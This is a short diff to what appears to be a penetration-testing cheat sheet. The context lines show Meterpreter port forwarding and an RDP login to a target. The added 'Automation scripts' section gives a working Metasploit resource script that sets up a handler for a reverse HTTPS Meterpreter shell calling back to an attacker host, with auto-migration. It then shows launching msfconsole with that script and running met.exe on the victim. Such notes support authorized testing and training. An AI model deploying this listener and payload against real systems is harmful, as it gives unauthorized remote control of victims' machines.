@@ -170,5 +170,21 @@ meterpreter > portfwd add -l 3389 -p 3389 -r $TargetIP
 $ xfreerdp /v:$TargetIP /u:luiza
 ```
 
+## Automation scripts
 
+```
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_https
+set lhost $AttackerIP
+set lport $AttackerPort
+
+set AutoRunScript post/windows/manage/migrate
+
+set ExitOnSession false
+
+run -z -j
+
+$ sudo msfconsole -r mymsfscript.rc
+PS > .\met.exe
+```
 
